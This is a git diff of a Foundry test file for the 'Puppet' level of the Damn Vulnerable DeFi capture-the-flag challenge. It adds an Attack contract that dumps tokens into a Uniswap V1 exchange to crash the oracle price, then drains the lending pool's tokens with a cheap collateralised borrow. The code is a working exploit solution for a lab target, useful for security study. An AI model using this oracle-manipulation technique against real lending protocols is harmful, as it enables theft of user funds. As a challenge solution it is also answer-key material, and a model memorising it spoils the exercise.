@@ -8,6 +8,28 @@ import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
+contract Attack {
+    function attack(address uniswapV1Exchange, PuppetPool lendingPool, DamnValuableToken token, address recovery)
+        external
+        payable
+    {
+        uint256 tokenBalance = token.balanceOf(address(this));
+        // decrease teh price of the pool by changing the liquidity of the exchange
+        token.approve(address(uniswapV1Exchange), tokenBalance);
+        IUniswapV1Exchange(uniswapV1Exchange).tokenToEthSwapInput(tokenBalance, 1 ether, block.timestamp + 2);
+
+        // now get the borrow amount first check it
+        uint256 borrowAmount = lendingPool.calculateDepositRequired(100000 ether);
+        console.log("borrow Amount comes out to be ", borrowAmount);
+
+        uint256 poolBalance = token.balanceOf(address(lendingPool));
+
+        lendingPool.borrow{value: msg.value}(poolBalance, recovery);
+    }
+
+    receive() external payable {}
+}
+
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -91,8 +113,10 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppet() public checkSolvedByPlayer {
-        
+    function test_puppetv1() public checkSolvedByPlayer {
+        Attack att = new Attack();
+        token.transfer(address(att), PLAYER_INITIAL_TOKEN_BALANCE);
+        att.attack{value: PLAYER_INITIAL_ETH_BALANCE}(address(uniswapV1Exchange), lendingPool, token, recovery);
     }
 
     // Utility function to calculate Uniswap prices
